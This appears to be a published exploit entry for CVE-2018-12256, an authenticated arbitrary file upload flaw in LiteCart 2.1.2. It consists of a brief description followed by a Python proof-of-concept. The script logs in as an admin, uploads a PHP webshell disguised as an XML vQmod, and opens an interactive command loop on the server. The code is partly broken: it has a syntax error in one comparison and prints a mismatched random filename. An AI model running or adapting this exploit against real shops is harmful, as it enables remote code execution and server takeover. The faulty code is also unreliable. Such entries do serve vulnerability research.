# Exploit Title: LiteCart 2.1.2 - Arbitrary File Upload
# Date: 2018-08-27
# Exploit Author: Haboob Team
# Software Link: https://www.litecart.net/downloading?version=2.1.2
# Version: 2.1.2
# CVE : CVE-2018-12256

# 1. Description
# admin/vqmods.app/vqmods.inc.php in LiteCart 2.1.2 allows remote authenticated attackers 
# to upload a malicious file (resulting in remote code execution) by using the text/xml 
# or application/xml Content-Type in a public_html/admin/?app=vqmods&doc=vqmods request.
 
# 2. Proof of Concept
 
#!/usr/bin/env python
import mechanize
import cookielib
import urllib2
import requests
import sys
import argparse
import random
import string





from cmd import Cmd
pooner = open('poone.php', 'r')



parser = argparse.ArgumentParser(description='LiteCart')
parser.add_argument('-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
args = parser.parse_args()
if(not args.u or not args.t or not args.p):
    sys.exit("-h for help")
url = args.t
user = args.u
password = args.p

br = mechanize.Browser()
cookiejar = cookielib.LWPCookieJar()
br.set_cookiejar( cookiejar )
br.set_handle_equiv( True )
br.set_handle_redirect( True )
br.set_handle_referer( True )
br.set_handle_robots( False )
br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
response = br.open(url)
br.select_form(name="login_form")
br["username"] = user
br["password"] = password
res = br.submit()
response = br.open(url + "?app=vqmods&doc=vqmods")
one=""
for form in br.forms():
    one= str(form).split("(")
    one= one[1].split("=")
    one= one[1].split(")")
    one = one[0]
cookies = br._ua_handlers['_cookies'].cookiejar
cookie_dict = {}
for c in cookies:
    cookie_dict[c.name] = c.value
rand = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
files = {
        'vqmod': ("ohnoesyouvebeenpooned" + ".php", pooner, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }



response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id")

if r.status_code == 200:
    print url + "../vqmod/xml/" + rand + ".php?c=id"
    print r.content
else:
    print "Sorry something went wrong"


#mods by github.com/p4yl0ad


class loop(Cmd):
    prompt="ayylmao > "
    def default(self, params):
        cmd_response = self.getfuktm8(params)
        print(cmd_response)

    def getfuktm8(self, cmd_response):
        target = url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=" + cmd_response
        cmd_response = requests.get(target)
        try:
            if cmd_response.status_code = 200:
                return cmd_response.content
        except:
            return None

loop().cmdloop()
